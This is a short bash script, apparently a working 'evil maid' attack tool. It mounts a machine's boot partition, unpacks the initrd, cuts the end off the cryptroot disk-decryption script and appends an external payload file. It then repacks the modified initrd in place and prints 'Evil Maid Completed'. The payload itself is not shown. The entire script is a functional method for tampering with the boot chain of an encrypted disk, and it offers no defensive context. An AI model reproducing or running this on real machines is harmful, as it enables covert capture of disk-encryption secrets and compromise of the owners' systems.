#!/usr/bin/env bash
wdir=$(pwd)
sudo apt install dracut-core -y
mkdir ~/target
mount -t ext4 /dev/sda1 ~/target
initrd=$(ls ~/target | grep initrd.img)
mkdir ~/out
cd ~/out
lsinitrd --unpack ~/target/$initrd
cd scripts/local-top
head -n -2 cryptroot > cryptroot2 && cat $wdir/payload.txt >> cryptroot2
mv cryptroot2 cryptroot
cd ~/out
find . | cpio -H newc -o | gzip -9 > ~/$initrd
mv ~/$initrd ~/target/$initrd
umount ~/target
echo "Evil Maid Completed"
exit 0